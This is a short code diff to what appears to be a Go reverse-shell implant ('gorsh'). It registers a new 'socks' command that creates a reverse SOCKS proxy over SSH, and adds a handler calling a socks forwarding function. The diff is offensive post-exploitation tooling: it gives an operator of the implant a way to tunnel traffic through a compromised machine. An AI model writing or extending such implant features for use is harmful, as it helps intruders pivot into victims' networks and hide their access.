@@ -10,6 +10,7 @@ import (
 	"github.com/audibleblink/gorsh/internal/directory"
 	"github.com/audibleblink/gorsh/internal/fetch"
 	"github.com/audibleblink/gorsh/internal/sitrep"
+	"github.com/audibleblink/gorsh/internal/socks"
 	"github.com/audibleblink/gorsh/internal/zip"
 )
 
@@ -45,6 +46,13 @@ func init() {
 			0,
 			false,
 			nil},
+		&Command{
+			"socks",
+			"<port>",
+			"Create a reverse SOCKS proxy on <port> over ssh",
+			1,
+			true,
+			socksFn},
 		&Command{
 			"cd",
 			"[path]",
@@ -129,6 +137,11 @@ func Route(argv []string) string {
 
 	output := cmd.Execute(argv)
 	return output
+}
+
+func socksFn(argv ...string) string {
+	socks.ListenAndForward(argv[1])
+	return "OK."
 }
 
 func cdFn(argv ...string) string {
